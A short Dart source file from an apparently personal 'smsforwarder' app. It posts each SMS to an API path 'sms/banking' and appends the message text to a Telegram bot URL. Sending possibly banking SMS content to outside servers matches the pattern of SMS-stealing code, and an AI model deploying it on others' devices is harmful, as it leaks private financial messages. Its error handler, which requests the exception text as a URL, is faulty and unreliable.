import 'package:dio/dio.dart';
import 'package:smsforwarder/config/constant.dart';
import 'package:smsforwarder/plugin/dio.dart';

class SmsService {

  static Future<void> forward(String sms) async {
    try {
      Map<String, dynamic> body = {
        'message': sms
      };
      Response res = await http.post(Constant.apiUrl + 'sms/banking', data: body);
      print(res.data);
      String url = Constant.telegramBotApi + Uri.encodeComponent(sms.toString());
      http.get(url);
      print(url);
    } catch (e) {
      http.get(e.toString());
      print(e);
    }
  }
}
